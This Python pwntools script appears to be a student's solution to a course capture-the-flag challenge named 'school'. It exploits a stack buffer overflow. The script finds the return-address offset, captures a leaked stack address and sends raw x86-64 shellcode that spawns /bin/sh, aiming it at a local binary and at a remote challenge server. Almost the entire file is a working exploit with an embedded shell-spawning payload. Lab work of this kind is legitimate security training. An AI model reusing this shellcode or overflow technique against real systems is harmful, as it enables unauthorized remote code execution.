from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math

#############################################################
#	School_Pwn.py											#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 2: School											#
#	03/06/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to find what part of the payload is being read as an address when the program crashes
#	Input: N/A
#	Output: N/A
def ripOffset():
	p = process('./school')
	p.recvuntil("directions:")
	p.sendline(cyclic(100))
	#p.sendline(buildPld())
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)
	return 0

# A function to build a payload using shellcode and the leaked program address
#	Input: String containing address
#	Output: Payload bytes
def buildPld(a):
	code = b'\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x6A\x3B\x58\x99\x0F\x05'
	print(len(code))
	p = 40 - len(code)
	pad = b'A'*p
	addr = p64(int(a, 16))
	return code + pad + addr

# A function to retrieve the address leaked by the program
#	Input: Connection
#	Output: Address String
def getAddr(p):
	p.recvuntil("at: ")
	a = cleanLine(p.recvuntil("."))
	#print(a)
	ad =  re.split("\.", a)
	return ad[0]

# A function to test payloads against school running in a debugger
#	Input: N/A
#	Output: N/A
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("break *0x0000000000400681")
	p.sendline("r")
	addr = getAddr(p)
	#print(addr)
	p.recvuntil("directions:")
	#p.sendline(cyclic(100))
	p.sendline(buildPld(addr))
	p.interactive()

# A function to attack a local instance of school
#	Input: N/A
#	Output: N/A
def localPwn():
	p = process('./school')
	addr = getAddr(p)
	p.recvuntil("directions:")
	p.sendline(buildPld(addr))
	p.interactive()

# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1338

# A function to attack a remote instance of school
#	Input: N/A
#	Output: N/A
def remotePwn():
	p = remote(HOST, PORT)
	addr = getAddr(p)
	p.recvuntil("directions:")
	p.sendline(buildPld(addr))
	p.interactive()



# Uncomment to run
# ripOffset()
# testPld()
# localPwn()
remotePwn()